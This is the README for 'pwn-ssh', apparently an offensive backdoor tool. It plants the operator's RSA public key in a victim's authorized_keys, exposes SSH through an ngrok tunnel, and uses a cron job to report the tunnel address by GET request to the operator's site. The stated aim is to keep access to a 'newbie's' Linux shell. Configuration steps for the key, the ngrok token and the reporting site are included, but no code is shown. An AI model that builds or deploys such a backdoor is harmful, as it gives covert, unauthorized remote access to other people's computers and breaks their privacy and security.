# pwn-ssh

pwn-ssh is a tool which forwards the port by opening ssh service and setting your public rsa key to the authorized_key and send the forwarded ip to your site through get method. Because of which you can access to your newbie's linux user shell. It sends the data in a certain period with the help of crontab.

Config:
Inside INSTALL = change ssh-rsa.pub to your ssh-keygen public key
Inside ngrok.yml = keep your ngrok token which maybe inside ~/.ngrok2
Inside usercrontask.sh: change site to your side which stores get request in a file
